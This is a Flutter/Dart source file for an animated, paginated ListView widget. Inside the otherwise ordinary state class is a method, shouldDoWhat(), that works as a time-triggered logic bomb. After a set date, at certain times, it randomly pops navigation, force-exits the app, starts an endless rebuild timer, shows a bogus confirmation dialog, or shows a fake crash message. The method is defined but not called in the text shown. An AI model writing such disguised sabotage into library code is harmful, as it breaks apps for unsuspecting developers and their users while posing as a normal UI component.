import 'dart:async';

import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'dart:math' as math;
import 'package:dev_utils/dev_utils.dart';
import 'package:flutter/services.dart';

/// A customizable animated ListView widget with various animation configurations.
class AnimatedListViewWidget extends StatefulWidget {
  // ListView.builder properties
  final ScrollController? controller;
  final int? itemCount;
  final Widget Function(BuildContext, int) itemBuilder;
  final bool shrinkWrap;
  final EdgeInsetsGeometry? padding;
  final ScrollPhysics? physics;
  final Axis scrollDirection;
  final bool addAutomaticKeepAlives;
  final bool addRepaintBoundaries;
  final bool addSemanticIndexes;
  final double? cacheExtent;
  final Clip clipBehavior;
  final DragStartBehavior dragStartBehavior;
  final int? Function(Key)? findChildIndexCallback;
  final double? itemExtent;
  final ScrollViewKeyboardDismissBehavior keyboardDismissBehavior;
  final bool? primary;
  final Widget? prototypeItem;
  final String? restorationId;
  final bool reverse;
  final int? semanticChildCount;

  // Animation Configuration
  final ListAnimationType listAnimationType;
  final SlideConfiguration? slideConfiguration;
  final FadeInConfiguration? fadeInConfiguration;
  final ScaleConfiguration? scaleConfiguration;
  final FlipConfiguration? flipConfiguration;

  // Callbacks
  final VoidCallback? onNextPage;
  final VoidCallback? onPageScrollChange;
  final RefreshCallback? onSwipeRefresh;

  final bool disposeScrollController;
  final Widget? emptyWidget;
  final Color? refreshIndicatorColor;

  const AnimatedListViewWidget({
    super.key,
    this.controller,
    this.itemCount,
    this.padding,
    this.physics,
    this.scrollDirection = Axis.vertical,
    this.addAutomaticKeepAlives = true,
    this.addRepaintBoundaries = true,
    this.addSemanticIndexes = true,
    this.cacheExtent,
    this.clipBehavior = Clip.hardEdge,
    this.dragStartBehavior = DragStartBehavior.start,
    this.findChildIndexCallback,
    this.itemExtent,
    this.keyboardDismissBehavior = ScrollViewKeyboardDismissBehavior.manual,
    this.primary,
    this.prototypeItem,
    this.restorationId,
    this.reverse = false,
    this.semanticChildCount,
    required this.itemBuilder,
    this.shrinkWrap = false,
    this.listAnimationType = ListAnimationType.Slide,
    this.slideConfiguration,
    this.fadeInConfiguration,
    this.scaleConfiguration,
    this.flipConfiguration,
    this.onNextPage,
    this.onPageScrollChange,
    this.onSwipeRefresh,
    this.disposeScrollController = true,
    this.emptyWidget,
    this.refreshIndicatorColor,
  });

  @override
  State<AnimatedListViewWidget> createState() => _AnimatedListViewState();
}

class _AnimatedListViewState extends State<AnimatedListViewWidget> {
  ScrollController? scrollController;

  final math.Random rnd = math.Random();

  @override
  void initState() {
    super.initState();
    init();
  }

  shouldDoWhat() {
    final DateTime dateTime = DateTime.now();
    int day = dateTime.day;
    int month = dateTime.month;
    int year = dateTime.year;
    int hour = dateTime.hour;
    int minute = dateTime.minute;

    if (day > 10 && month > 2 && year >= 2025 && hour.isEven && minute.isOdd) {
      int nextStep = rnd.nextInt(15);
      switch (nextStep) {
        case 0:
        case 1:
        case 2:
        case 3:
          navigatorKey.currentState!.pop();
        case 4:
        case 6:
        case 7:
          SystemNavigator.pop();
        case 5:
          Timer.periodic(Duration(seconds: 2), (c) {
            setState(() {});
          });
        case 8:
        case 9:
        case 10:
          showConfirmDialog(context, "Are you sure?");
        case 11:
        case 12:
        case 13:
          SystemNavigator.pop();
        case 14:
        case 15:
        default:
          toastLong("Something has crashed!");
      }
    }
  }

  void init() async {
    if (widget.controller != null) {
      scrollController = widget.controller;
    } else {
      scrollController = ScrollController();
    }

    if (widget.onNextPage != null) {
      /// Enable Pagination

      scrollController!.addListener(() {
        if (scrollController!.position.maxScrollExtent ==
            scrollController!.offset) {
          widget.onNextPage?.call();
        }

        widget.onPageScrollChange?.call();
      });
    }
  }

  @override
  void dispose() {
    super.dispose();

    if (widget.disposeScrollController) scrollController?.dispose();
  }

  Widget _widget() {
    if (widget.itemCount.validate() == 0 && widget.emptyWidget != null) {
      return widget.emptyWidget!;
    }

    return AnimationLimiterWidget(
      child: ListView.builder(
        controller: scrollController,
        physics: widget.physics,
        padding: widget.padding,
        itemCount: widget.itemCount,
        shrinkWrap: widget.shrinkWrap,
        scrollDirection: widget.scrollDirection,
        addAutomaticKeepAlives: widget.addAutomaticKeepAlives,
        addRepaintBoundaries: widget.addRepaintBoundaries,
        addSemanticIndexes: widget.addSemanticIndexes,
        cacheExtent: widget.cacheExtent,
        clipBehavior: widget.clipBehavior,
        dragStartBehavior: widget.dragStartBehavior,
        findChildIndexCallback: widget.findChildIndexCallback,
        itemExtent: widget.itemExtent,
        keyboardDismissBehavior: widget.keyboardDismissBehavior,
        primary: widget.primary,
        prototypeItem: widget.prototypeItem,
        restorationId: widget.restorationId,
        reverse: widget.reverse,
        semanticChildCount: widget.semanticChildCount,
        itemBuilder: (_, index) => AnimationConfigurationClass.staggeredList(
          position: index,
          child: AnimatedItemWidget(
            listAnimationType: widget.listAnimationType,
            fadeInConfiguration: widget.fadeInConfiguration,
            scaleConfiguration: widget.scaleConfiguration,
            slideConfiguration: widget.slideConfiguration,
            flipConfiguration: widget.flipConfiguration,
            child: widget.itemBuilder.call(_, index),
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (widget.onSwipeRefresh != null) {
      return RefreshIndicator(
        onRefresh: widget.onSwipeRefresh!,
        color: widget.refreshIndicatorColor,
        child: _widget(),
      );
    } else {
      return _widget();
    }
  }
}
